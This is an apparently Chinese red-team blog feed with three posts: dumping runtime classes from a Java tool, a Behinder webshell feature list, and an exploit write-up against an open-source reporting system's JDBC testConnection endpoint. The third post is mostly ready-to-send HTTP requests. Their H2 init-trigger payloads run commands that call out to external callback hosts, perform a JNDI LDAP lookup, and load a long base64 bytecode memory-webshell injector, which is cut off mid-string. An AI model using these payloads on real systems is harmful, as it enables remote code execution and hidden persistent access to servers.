{"posts":[{"title":"某Java工具逆向分析记录","content":"0x01 大致情况: 获取到一个修改版的Java工具, 想研究下具体的功能,学习一下, 直接反编译,发现存在自定义的 ClassLoader 具体功能都是 通过ClassLoader 去加载 bytecode 来实现的.直接反编译并不能直接查看功能代码 0x02 反编译思路 jar 包最终运行肯定加载的到 jvm 虚拟机当中,我们的目的是,从虚拟机中 dump 出所有的解密后的 Class 搜索相关成熟的实现,发现阿里的 Java 应用诊断利器Arthas 仔细看了下功能发现,有相关实现的命令 dump 但是他只支持部分的 dump 通过我们已知的关键字 dump 下,发现可以成功看到对应的类文件, 测试发现只能 dump 个别的类,而且限制了数量: 测试 dump 一个 Class 看下有没有问题 : 但是我们的目的是dump所有Class. 关键字搜索了下,发现 github issus 发现 有同样的问题: 作者也表明没有这样具体的功能: 后续查看了下作者的 github, 其他项目 发现了这个工具 https://github.com/hengyunabc/dumpclass 直接利用下,成功dump *core*.* 尝试dump *shell** 最终成功获取到 Java 工具的所有功能代码: 0x03 参考工具 GitHub - hengyunabc/dumpclass: Dump classes from running JVM process. Arthas ","link":"https://1oecho.github.io/m8USU7X8p/"},{"title":"红队开发: Behinder3-Beta11 实战下的二次开发 （5）","content":"最终结果: 代理验证 单目标-存活检测 命令执行（嫖来的） JNI Windows 命令执行 （嫖来的） 内存马管理（嫖来的） 代理管理 diy_狗洞 Stowaway Spp 多协议代理 （Quic算法实现的TCP代理） 正向代理 反向代理 代理情况记录： ","link":"https://1oecho.github.io/Wb2nktU9J/"},{"title":"漏洞利用: 某开源报表 JDBC命令执行漏洞利用","content":"0x00 系统占比： 0x01 H2 代码执行 判断是否存在依赖 POST /jmreport/testConnection HTTP/1.1 Host: xxxxxx Content-Length: 301 Accept: application/json, text/plain, */* X-Access-Token: null User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 token: null Content-Type: application/json;charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close {&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\n java.lang.Runtime.getRuntime().exec('cmd /c ping jm.tk2zx.eyes.sh')$$&quot;,&quot;dbUsername&quot;:&quot;jeecgbootbpm&quot;,&quot;dbPassword&quot;:&quot;jeecg196283&quot;} 漏洞EXP POST /jmreport/testConnection HTTP/1.1 Host: xxxxxx Content-Length: 301 Accept: application/json, text/plain, */* X-Access-Token: null User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 token: null Content-Type: application/json;charset=UTF-8menuType=chartinfo Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1678245989; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1678257760 Connection: close {&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\n java.lang.Runtime.getRuntime().exec('cmd /c ping jm.tk2zx.eyes.sh')$$&quot;,&quot;dbUsername&quot;:&quot;jeecgbootbpm&quot;,&quot;dbPassword&quot;:&quot;jeecg196283&quot;} H2 代码执行： JNDI注入 POST /jmreport/testConnection HTTP/1.1 Host: 192.168.2.130:8085 Content-Length: 330 Accept: application/json, text/plain, */* X-Access-Token: null User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 token: null Content-Type: application/json;charset=UTF-8 menuType=chartinfo Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close {&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\n new javax.naming.InitialContext().lookup('ldap://b0c0fbizh70qgg2yh1cxngffz65xtvhk.oastify.com')$$&quot;,&quot;dbUsername&quot;:&quot;jeecgbootbpm&quot;,&quot;dbPassword&quot;:&quot;jeecg196283&quot;} 无依赖注入内存马： POST /jmreport/testConnection HTTP/1.1 Host: 192.168.2.130:8085 Content-Length: 24012 Accept: application/json, text/plain, */* X-Access-Token: null User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 token: null Content-Type: application/jsonß;charset=UTF-8 menuType=chartinfo Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close {&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\nvar classLoader = java.lang.Thread.currentThread().getContextClassLoader()\\\\;try{classLoader.loadClass('Injext').newInstance()\\\\;}catch (e){var clsString = classLoader.loadClass('java.lang.String')\\\\;var bytecodeBase64 = 'yv66vgAAADQArgoADQBcCABdCABeCgAGAF8IADUHAGAHAGEKAAYAYgcAYwgAZAcAZQoAZgBnBwBoCgBpAGoHAGsKAA8AbAoAZgBtBwBuCABvCwASAHAHAHEHAHIIAHMIAEUKAAYAdAoAdQBnCgB1AHYHAHcHAHgKAAYAeQoAHQB6CgB7AHwKAHsAfQcAfggAfwcAgAcASAkAgQCCCACDCgCBAIQKACIAhQoAHACGBwCHBwCIAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMSW5qZXh0OwEACDxjbGluaXQ+AQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAcUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAQExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZzsBAB9EZWZhdWx0QW5ub3RhdGlvbkhhbmRsZXJNYXBwaW5nAQACZTIBACpMb3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbjsBABNSZXF1ZXN0Q29udGV4dFV0aWxzAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAJtMAEAA2I2NAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAgAcAYAcAYwcAiQcAbgcAcgcAcQcAhwEAClNvdXJjZUZpbGUBAAtJbmpleHQuamF2YQwALQAuATMkeXY2NnZnQUFBRFFDRGdvQWxBRUlDQUVKQ1FDVEFRb0lBSmNKQUpNQkN3Y0JEQW9BQmdFSUNnQUdBUTBLQUFZQkRnb0Frd0VQQ1FDVEFSQUlBUkVLQUJNQkVnZ0JFd29BRXdFVUNnRVZBUllLQUJVQkZ3Z0JHQWNCR1FjQkdnY0JHd2NBcXdjQkhBZ0JIUW9BRXdFZUNBRWZDQUVnQ2dFaEFTSUtBQlFCSXdvQUZBRWtDZ0VoQVNVSEFTWUtBU0VCSndvQUlBRW9DZ0FnQVNrS0FCUUJLZ2dCS3dnQkxBZ0JMUWdCTGdnQkx3c0JNQUV4Q0FFeUNnQVVBVE1IQVRRSEFUVUlBTG9IQVRZSEFUY0lBTHdJQVRnSUFNQUtBQlFCT1FnQk9nb0JPd0U4Q2dBVUFUMElBVDRLQUJRQlB3Z0JRQWdCUVFnQlFnY0JRd29CUkFGRkNnRkVBVVlLQVVjQlNBb0FQZ0ZKQ0FGS0NnQStBVXNLQUQ0QlRBb0FNQUZOQ2dGT0FVOElBVkFMQVRBQlVRZ0JVZ29BRkFGVEJ3RlVDZ0JNQVFnS0FDMEJWUWdBNlFvQVRBRldDQURyQ0FEWUN3RXdBVmNLQVZnQldRZ0JXZ29BRXdGYkNnRmNBVjBLQVZ3QlhnY0JYd2dBelFjQllBb0FXd0ZoQ0FEUkJ3RmlDZ0JlQVdNTEFXUUJaUXNCWmdGbkN3Rm1BV2dIQVdvTEFHTUJhd2dCYkFnQmJRb0FGQUZ1Q3dCakFXOEhBWEFLQUdrQmNRZ0JjZ29BYVFGekNBRjBDd0YxQVhZSUFYY0tBWGdCZVFjQmVnb0FjUUY3Q2dGNEFYd0lBWDBJQVg0SkFYOEJnQW9BRXdHQkNnRVZBVjBIQVlJS0FIa0JDQW9BZVFHRENnRjRBWVFLQVlVQmhnb0JoUUdIQ2dGL0FZZ0tBQlVCVXdnQmlRc0JNQUdLQ2dDVEFZc0tBSk1CakFrQWt3R05Cd0dPQndHUENnQ0dBWkFIQVpFSEFaSUtBSW9CQ0FzQmt3Rk5DZ0FVQVpRS0FVNEJsUW9BRlFFT0NnQ0tBWllLQUpNQmx3b0FGQUdZQndHWkJ3R2FBUUFDZUdNQkFCSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQVJ3WVhOekFRQURiV1ExQVFBSGNHRjViRzloWkFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUdQR2x1YVhRK0FRQURLQ2xXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQURoTWVYTnZjMlZ5YVdGc0wzQmhlV3h2WVdSekwzUmxiWEJzWVhSbGN5OVRjSEpwYm1kSmJuUmxjbU5sY0hSdmNsUmxiWEJzWVhSbE93RUFER0poYzJVMk5FUmxZMjlrWlFFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUFka1pXTnZaR1Z5QVFBU1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUdZbUZ6WlRZMEFRQUJaUUVBRlV4cVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dU93RUFBbUp6QVFBRmRtRnNkV1VCQUFKYlFnRUFEVk4wWVdOclRXRndWR0ZpYkdVSEFSb0hBUndCQUFwRmVHTmxjSFJwYjI1ekFRQW1LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFGdEFRQWRUR3BoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkRHNCQUFGekFRQURjbVYwQVFBTVltRnpaVFkwUlc1amIyUmxBUUFXS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCMFZ1WTI5a1pYSUJBQWx3Y21WSVlXNWtiR1VCQUdRb1RHcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUTdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUtaMlYwVW1WeGRXVnpkQUVBR2t4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBTFoyVjBVbVZ6Y0c5dWMyVUJBQVJqYldSekFRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQm5KbGMzVnNkQUVBQTJOdFpBRUFCRzVsZUhRQkFBVkZiblJ5ZVFFQURFbHVibVZ5UTJ4aGMzTmxjd0VBRlV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNU93RUFDSEJoY21GdFMyVjVBUUFPY0dGeVlXMVdZV3gxWlV4cGMzUUJBQlZNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZERzQkFBVm1hV1ZzWkFFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBdHlaV0ZzVW1WeGRXVnpkQUVBSjB4dmNtY3ZZWEJoWTJobEwyTmhkR0ZzYVc1aEwyTnZibTVsWTNSdmNpOVNaWEYxWlhOME93RUFFbU52ZVc5MFpWSmxjWFZsYzNSR2FXVnNaQUVBRFdOdmVXOTBaVkpsY1hWbGMzUUJBQnRNYjNKbkwyRndZV05vWlM5amIzbHZkR1V2VW1WeGRXVnpkRHNCQUFwd1lYSmhiV1YwWlhKekFRQW9URzl5Wnk5aGNHRmphR1V2ZEc5dFkyRjBMM1YwYVd3dmFIUjBjQzlRWVhKaGJXVjBaWEp6T3dFQUQzQmhjbUZ0U0dGemFGWmhiSFZsY3dFQUNIQmhjbUZ0VFdGd0FRQVpUR3BoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd093RUFDR2wwWlhKaGRHOXlBUUFVVEdwaGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2pzQkFBdHdZV2RsUTI5dWRHVjRkQUVBRTB4cVlYWmhMM1YwYVd3dlNHRnphRTFoY0RzQkFBZHpaWE56YVc5dUFRQWdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnpjMmx2YmpzQkFBRnJBUUFCWXdFQUZVeHFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlPd0VBQm0xbGRHaHZaQUVBRG1WMmFXeGpiR0Z6YzE5aWVYUmxBUUFKWlhacGJHTnNZWE56QVFBT2RYSnNRMnhoYzNOTWIyRmtaWElCQUJsTWFtRjJZUzl1WlhRdlZWSk1RMnhoYzNOTWIyRmtaWEk3QVFBSlpHVm1UV1YwYUc5a0FRQUdZWEp5VDNWMEFRQWZUR3BoZG1FdmFXOHZRbmwwWlVGeWNtRjVUM1YwY0hWMFUzUnlaV0Z0T3dFQUFXWUJBQVJrWVhSaEFRQUxiR0Z6ZEZKbGNYVmxjM1FCQUF4c1lYTjBVbVZ6Y0c5dWMyVUJBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQUhhR0Z1Wkd4bGNnRUFGa3h2WTJGc1ZtRnlhV0ZpYkdWVWVYQmxWR0ZpYkdVQkFGSk1hbUYyWVM5MWRHbHNMMDFoY0NSRmJuUnllVHhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenRNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZER4TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzK096NDdBUUFwVEdwaGRtRXZkWFJwYkM5QmNuSmhlVXhwYzNROFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1Bqc0JBR2hNYW1GMllTOTFkR2xzTDBsMFpYSmhkRzl5UEV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNVBFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8weHFZWFpoTDNWMGFXd3ZRWEp5WVhsTWFYTjBQRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PejQ3UGpzK093Y0JHd2NCbXdjQXZnY0JWQWNCbkFjQm1RY0JuUWNCbmdjQm53Y0JYd2NCWUFjQm9BY0JZZ2NCb1FjQmFnY0JjQUVBQVhnQkFBY29XMEphS1Z0Q0FRQUJXZ2NCb2dFQUNsTnZkWEpqWlVacGJHVUJBQjVUY0hKcGJtZEpiblJsY21ObGNIUnZjbFJsYlhCc1lYUmxMbXBoZG1FTUFKc0FuQUVBRUdZMU5XVXlOemMwTmpnNE5HRTBZbVFNQUpVQWxnd0Fsd0NXQVFBWGFtRjJZUzlzWVc1bkwxTjBjbWx1WjBKMWFXeGtaWElNQWFNQnBBd0JwUUdtREFDWUFMQU1BSmdBbGdFQUVHcGhkbUV1ZFhScGJDNUNZWE5sTmpRTUFhY0JxQUVBQ21kbGRFUmxZMjlrWlhJTUFha0JxZ2NCbXd3QnF3R3NEQUd0QWE0QkFBWmtaV052WkdVQkFBOXFZWFpoTDJ4aGJtY3ZRMnhoYzNNQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVFhbUYyWVM5c1lXNW5MMDlpYW1WamRBRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRCQUJaemRXNHViV2x6WXk1Q1FWTkZOalJFWldOdlpHVnlEQUd2QWJBQkFBeGtaV052WkdWQ2RXWm1aWElCQUFOTlJEVUhBYkVNQWJJQnN3d0J0QUcxREFHMkFiY01BYmdCdVFFQUZHcGhkbUV2YldGMGFDOUNhV2RKYm5SbFoyVnlEQUc2QWJVTUFKc0J1d3dCcFFHOERBRzlBYVlCQUFwblpYUkZibU52WkdWeUFRQU9aVzVqYjJSbFZHOVRkSEpwYm1jQkFCWnpkVzR1Yldsell5NUNRVk5GTmpSRmJtTnZaR1Z5QVFBR1pXNWpiMlJsQVFBSFVtVm1aWEpsY2djQm5Rd0J2Z0N3QVFBWGFIUjBjSE02THk5M2QzY3VaMjl2WjJ4bExtTnZiUzhNQWI4QndBRUFLMjl5Wnk5aGNHRmphR1V2WTJGMFlXeHBibUV2WTI5dWJtVmpkRzl5TDFKbGNYVmxjM1JHWVdOaFpHVUJBQ05xWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYRjFaWE4wVjNKaGNIQmxjZ0VBTEc5eVp5OWhjR0ZqYUdVdlkyRjBZV3hwYm1FdlkyOXVibVZqZEc5eUwxSmxjM0J2Ym5ObFJtRmpZV1JsQVFBa2FtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ6Y0c5dWMyVlhjbUZ3Y0dWeUFRQU5lQzFqYkdsbGJuUXRaR0YwWVF3QndRSENBUUFIYjNNdWJtRnRaUWNCd3d3QnhBQ3dEQUhGQWFZQkFBTjNhVzRNQWNZQnh3RUFBaTlqQVFBSkwySnBiaTlpWVhOb0FRQUNMV01CQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2djQnlBd0J5UUhLREFITEFjd0hBYzBNQWM0Qnp3d0Ftd0hRQVFBQ1hFRU1BZEVCMGd3QXdRR21EQUhUQWRRSEFkVU1BZFlCMXdFQUNISmxZbVY1YjI1a0RBR3BBYVlCQUFSUVQxTlVEQUhZQWRrQkFCRnFZWFpoTDNWMGFXd3ZTR0Z6YUUxaGNBd0IyZ0hiREFIY0FkME1BZDRCM3djQjRBd0I0UUdtQVFBQURBSGlBZU1IQVo4TUFlUUI1UXdCNWdIbkFRQWxiM0puTDJGd1lXTm9aUzlqWVhSaGJHbHVZUzlqYjI1dVpXTjBiM0l2VW1WeGRXVnpkQUVBR1c5eVp5OWhjR0ZqYUdVdlkyOTViM1JsTDFKbGNYVmxjM1FNQWVnQjZRRUFGMnBoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd0RBSHFBZXNIQWV3TUFOUUI3UWNCb1F3QjdnSENEQURCQWJBSEFlOEJBQk5xWVhaaEwzVjBhV3d2VFdGd0pFVnVkSEo1REFId0FiQUJBQUVnQVFBQkt3d0I4UUh5REFIekFiQUJBQk5xWVhaaEwzVjBhV3d2UVhKeVlYbE1hWE4wREFIMEFiY0JBQUU5REFIbUFmVUJBQUYxQndHY0RBSDJBZmNCQUFOQlJWTUhBYUlNQWJJQitBRUFIMnBoZG1GNEwyTnllWEIwYnk5emNHVmpMMU5sWTNKbGRFdGxlVk53WldNTUFKc0IrUXdCK2dIN0FRQVZhbUYyWVM1c1lXNW5Ma05zWVhOelRHOWhaR1Z5QVFBTFpHVm1hVzVsUTJ4aGMzTUhBZndNQWYwQW1nd0IvZ0dxQVFBV2MzVnVMMjFwYzJNdlFrRlRSVFkwUkdWamIyUmxjZ3dCSHdDakRBSC9BZ0FIQWdFTUFnSUNBd3dDQkFJRkRBSUdBZ2NCQUFobmIyUjZhV3hzWVF3Q0NBQ3dEQUNpQUtNTUFRSUJBd3dBbVFDYUFRQVhhbUYyWVM5dVpYUXZWVkpNUTJ4aGMzTk1iMkZrWlhJQkFBeHFZWFpoTDI1bGRDOVZVa3dNQUpzQ0NRRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUhXcGhkbUV2YVc4dlFubDBaVUZ5Y21GNVQzVjBjSFYwVTNSeVpXRnRCd0dlREFJS0Fnc01BZ3dCMXd3Q0RRRzFEQUMxQUxZTUFnb0J2QUVBTm5semIzTmxjbWxoYkM5d1lYbHNiMkZrY3k5MFpXMXdiR0YwWlhNdlUzQnlhVzVuU1c1MFpYSmpaWEIwYjNKVVpXMXdiR0YwWlFFQVFXOXlaeTl6Y0hKcGJtZG1jbUZ0WlhkdmNtc3ZkMlZpTDNObGNuWnNaWFF2YUdGdVpHeGxjaTlJWVc1a2JHVnlTVzUwWlhKalpYQjBiM0pCWkdGd2RHVnlBUUFZYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2VFdWMGFHOWtBUUFlYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dUFRQWxhbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkQUVBSm1waGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObEFRQVhhbUYyWVM5c1lXNW5MM0psWm14bFkzUXZSbWxsYkdRQkFDWnZjbWN2WVhCaFkyaGxMM1J2YldOaGRDOTFkR2xzTDJoMGRIQXZVR0Z5WVcxbGRHVnljd0VBRW1waGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2dFQUUycGhkbUY0TDJOeWVYQjBieTlEYVhCb1pYSUJBQVpoY0hCbGJtUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjanNCQUFoMGIxTjBjbWx1WndFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFIWm05eVRtRnRaUUVBSlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBbG5aWFJOWlhSb2IyUUJBRUFvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3VzB4cVlYWmhMMnhoYm1jdlEyeGhjM003S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBR2FXNTJiMnRsQVFBNUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFJWjJWMFEyeGhjM01CQUJNb0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFHMnBoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkQUVBQzJkbGRFbHVjM1JoYm1ObEFRQXhLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXpaV04xY21sMGVTOU5aWE56WVdkbFJHbG5aWE4wT3dFQUNHZGxkRUo1ZEdWekFRQUVLQ2xiUWdFQUJteGxibWQwYUFFQUF5Z3BTUUVBQm5Wd1pHRjBaUUVBQnloYlFrbEpLVllCQUFaa2FXZGxjM1FCQUFZb1NWdENLVllCQUJVb1NTbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQXQwYjFWd2NHVnlRMkZ6WlFFQUNXZGxkRWhsWVdSbGNnRUFFR1Z4ZFdGc2MwbG5ibTl5WlVOaGMyVUJBQlVvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZvQkFBZHBjMFZ0Y0hSNUFRQURLQ2xhQVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBaGpiMjUwWVdsdWN3RUFHeWhNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BXZ0VBRVdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsQVFBS1oyVjBVblZ1ZEdsdFpRRUFGU2dwVEdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsT3dFQUJHVjRaV01CQUNnb1cweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTTdBUUFSYW1GMllTOXNZVzVuTDFCeWIyTmxjM01CQUE1blpYUkpibkIxZEZOMGNtVmhiUUVBRnlncFRHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdBUUFZS0V4cVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdE95bFdBUUFNZFhObFJHVnNhVzFwZEdWeUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOTFkR2xzTDFOallXNXVaWEk3QVFBSloyVjBWM0pwZEdWeUFRQVhLQ2xNYW1GMllTOXBieTlRY21sdWRGZHlhWFJsY2pzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlBUUFIY0hKcGJuUnNiZ0VBRlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFZnRUFCbVZ4ZFdGc2N3RUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwV2dFQUNtZGxkRk5sYzNOcGIyNEJBQ0lvS1V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sYzNOcGIyNDdBUUFEY0hWMEFRQTRLRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFsblpYUlNaV0ZrWlhJQkFCb29LVXhxWVhaaEwybHZMMEoxWm1abGNtVmtVbVZoWkdWeU93RUFGbXBoZG1FdmFXOHZRblZtWm1WeVpXUlNaV0ZrWlhJQkFBaHlaV0ZrVEdsdVpRRUFFR2RsZEVSbFkyeGhjbVZrUm1sbGJHUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5R2FXVnNaRHNCQUExelpYUkJZMk5sYzNOcFlteGxBUUFFS0ZvcFZnRUFBMmRsZEFFQUppaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFOWjJWMFVHRnlZVzFsZEdWeWN3RUFLaWdwVEc5eVp5OWhjR0ZqYUdVdmRHOXRZMkYwTDNWMGFXd3ZhSFIwY0M5UVlYSmhiV1YwWlhKek93RUFDR1Z1ZEhKNVUyVjBBUUFSS0NsTWFtRjJZUzkxZEdsc0wxTmxkRHNCQUExcVlYWmhMM1YwYVd3dlUyVjBBUUFXS0NsTWFtRjJZUzkxZEdsc0wwbDBaWEpoZEc5eU93RUFCMmhoYzA1bGVIUUJBQTFxWVhaaEwzVjBhV3d2VFdGd0FRQUdaMlYwUzJWNUFRQUtjbVZ3YkdGalpVRnNiQUVBT0NoTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUlaMlYwVm1Gc2RXVUJBQVJ6YVhwbEFRQVZLRWtwVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QVFBSWNIVjBWbUZzZFdVQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVllCQUNrb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlPd